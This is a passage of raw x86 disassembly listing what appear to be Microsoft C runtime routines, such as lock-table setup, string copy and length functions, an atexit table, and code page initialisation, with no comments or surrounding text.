  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
